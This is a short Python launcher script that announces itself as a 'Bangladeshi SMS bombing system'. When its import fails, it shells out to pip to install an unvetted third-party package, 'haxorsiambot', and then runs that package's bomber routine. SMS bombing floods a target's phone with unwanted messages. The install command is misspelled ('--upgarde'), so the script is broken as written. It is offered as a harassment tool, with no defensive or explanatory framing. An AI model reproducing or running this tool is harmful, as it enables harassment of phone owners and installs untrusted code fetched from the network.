import os

#  THIS IS BANGLADESHI SMS BOMBING SYSTEM
# IF YOU CAN USE THIS SYSTEM CODE BELLOW HERE


import os,requests,sys
try:
    from bomber import bomber
except:
    os.system('pip install --upgarde haxorsiambot')


try:
    bomber.main()
except Exception as err:
    print(err)